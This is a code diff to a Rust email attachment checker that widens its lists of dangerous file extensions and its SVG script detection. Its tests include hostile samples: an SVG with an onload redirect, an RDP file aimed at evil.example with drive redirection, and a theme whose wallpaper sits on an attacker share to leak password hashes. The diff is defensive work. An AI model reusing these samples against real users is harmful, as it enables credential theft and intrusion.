@@ -152,8 +152,15 @@ fn looks_like_text(head: &str) -> bool {
 const PROGRAMS: &[&str] = &[
     "exe", "scr", "com", "pif", "cpl", "msi", "msix", "msp", "appx", "appxbundle", "dll", "bat", "cmd", "js", "jse",
     "vbs", "vbe", "wsf", "wsh", "hta", "ps1", "psm1", "jar", "lnk", "reg", "inf", "scf", "url", "application",
-    "gadget", "msc", "sh", "app", "command", "apk", "deb", "rpm", "dmg", "pkg", "xll", "iqy", "slk",
+    "gadget", "msc", "sh", "app", "command", "apk", "deb", "rpm", "dmg", "pkg", "xll", "iqy", "slk", "py", "pyw",
+    "chm", "ws", "wsc", "sct", "one", "settingcontent-ms", "library-ms", "search-ms", "appref-ms", "website",
+    // Opened by a system tool that connects or installs: Remote Desktop, App Installer, themes
+    // (a wallpaper on a share leaks the Windows password hash), troubleshooters.
+    "rdp", "appinstaller", "theme", "themepack", "desktopthemepack", "diagcab", "xbap", "msh", "msh1", "msh2",
+    "ps1xml", "psc1", "mshxml", "hlp",
 ];
+/// Opened by a browser, where they may run scripts: shown in facteur only.
+const ACTIVE_IMAGES: &[&str] = &["svg", "svgz", "xht", "xhtm"];
 /// Disk images: mounted on a double click, they bypass Windows' protections.
 const DISK_IMAGES: &[&str] = &["iso", "img", "vhd", "vhdx"];
 const MACRO_OFFICE: &[&str] = &["docm", "dotm", "xlsm", "xltm", "xlsb", "xlam", "pptm", "potm", "ppam", "ppsm", "sldm"];
@@ -165,7 +172,9 @@ const ARCHIVES: &[&str] = &["zip", "rar", "7z", "gz", "tgz", "tar", "bz2", "xz",
 /// disk image or a macro document, by what it is and by the name it was saved under, and not
 /// judged suspicious (saving one anyway, once warned, is no consent to running it).
 pub fn openable(report: &AttachmentReport, saved_as: &str) -> bool {
-    let risky = |name: &str| ext(name).is_some_and(|e| PROGRAMS.contains(&e.as_str()) || DISK_IMAGES.contains(&e.as_str()) || MACRO_OFFICE.contains(&e.as_str()));
+    let risky = |name: &str| {
+        ext(name).is_some_and(|e| [PROGRAMS, DISK_IMAGES, MACRO_OFFICE, ACTIVE_IMAGES].iter().any(|list| list.contains(&e.as_str())))
+    };
     report.kind != Kind::Executable && !report.trust.is_low() && !risky(&report.filename) && !risky(saved_as)
 }
 
@@ -243,7 +252,7 @@ pub fn inspect(filename: &str, declared_mime: &str, data: &[u8], message_trust: 
         note(&mut score, &mut reasons, -50, tr!("Fichier exécutable (.{e}) : l'ouvrir lance un programme sur l'ordinateur", "Executable file (.{e}): opening it runs a program on the computer"));
     } else if DISK_IMAGES.contains(&e) {
         note(&mut score, &mut reasons, -35, tr!("Image disque (.{e}) : souvent utilisée pour faire passer un programme", "Disk image (.{e}): often used to sneak in a program"));
-    } else if matches!(e, "html" | "htm" | "xhtml" | "shtml" | "mht" | "mhtml") {
+    } else if matches!(e, "html" | "htm" | "xhtml" | "xht" | "xhtm" | "shtml" | "mht" | "mhtml") {
         note(&mut score, &mut reasons, -25, tr!("Page web jointe : technique courante pour imiter une page de connexion", "Attached web page: a common trick to imitate a sign-in page"));
     }
     let disguised = !trapped && (filename.chars().any(invisible) || filename.trim_end() != filename.trim_end().trim_end_matches('.'));
@@ -300,7 +309,11 @@ pub fn inspect(filename: &str, declared_mime: &str, data: &[u8], message_trust: 
             }
         }
         Detected::Svg => {
-            if contains(&data.to_ascii_lowercase(), b"<script") {
+            let lower = data.to_ascii_lowercase();
+            if [&b"<script"[..], b"javascript:", b"<foreignobject", b"onload=", b"onclick=", b"onerror=", b"onmouseover=", b"onbegin="]
+                .iter()
+                .any(|code| contains(&lower, code))
+            {
                 note(&mut score, &mut reasons, -20, tr!("Image SVG contenant du code : à n'ouvrir que dans facteur", "SVG image containing code: only open it in facteur"));
             }
         }
@@ -438,6 +451,15 @@ mod tests {
         assert!(!openable(&program, "facture.pdf"), "a program under a document's name");
         let macro_doc = inspect("devis.docm", "application/octet-stream", b"PK\x03\x04", None);
         assert!(!openable(&macro_doc, "devis.docm"));
+        let svg = inspect("facture.svg", "image/svg+xml", br#"<svg xmlns="http://www.w3.org/2000/svg" onload="location='https://x/'">"#, None);
+        assert!(!openable(&svg, "facture.svg"), "a browser would run its script");
+        assert!(!svg.trust.reasons.is_empty(), "event handlers count as code");
+        let python = inspect("outil.py", "text/plain", b"import os\nprint(1)\n", None);
+        assert!(!openable(&python, "outil.py"));
+        let rdp = inspect("acces-vpn.rdp", "application/x-rdp", b"full address:s:evil.example\nredirectdrives:i:1\n", None);
+        assert!(!openable(&rdp, "acces-vpn.rdp"), "Remote Desktop would connect to the sender's machine");
+        let theme = inspect("noel.theme", "text/plain", b"[Control Panel\\Desktop]\nWallpaper=\\\\evil\\share\\a.jpg\n", None);
+        assert!(!openable(&theme, "noel.theme"));
     }
 
     #[test]
